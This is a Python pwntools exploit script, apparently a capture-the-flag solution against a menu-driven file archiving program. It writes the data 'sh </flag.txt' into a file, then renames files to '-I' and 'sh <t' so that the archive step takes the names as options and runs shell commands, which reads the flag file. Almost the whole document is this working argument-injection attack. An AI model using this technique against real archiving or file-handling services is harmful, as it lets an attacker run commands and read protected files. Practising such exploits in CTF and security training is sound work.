#!/usr/bin/env python3


from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=False)
# libc = ELF(elf.libc)
# context.terminal = ["terminator", "-u", "-e"]
# context.terminal = ["remotinator", "vsplit", "-x"]


def get_conn(argv=[], *a, **kw):
	host = args.HOST or ''
	port = int(args.PORT or 1337)
	if args.GDB:
		return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote(host, port)
	else:
		return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''
gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
env = {}

io = get_conn([], env=env)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr


for file in ['a', 'b', 't']:
	sla(b'>', b'1')
	sla(b'Input filename: ', file.encode())


sla(b'>', b'5')
sla(b'Input filename: ', b't')
sla(b'Input data: ', b'sh </flag.txt')
# sla(b'Input data: ', b'for i in /*; do echo $i; done')


sla(b'>', b'2')
sla(b'Input filename: ', b'a')
sla(b'Input new filename: ', b'-I')

sla(b'>', b'2')
sla(b'Input filename: ', b'b')
sla(b'Input new filename: ', b'sh <t')

sla(b'>', b'7')
sla(b'Input archive name: ', b'flag')

success(rl().decode())
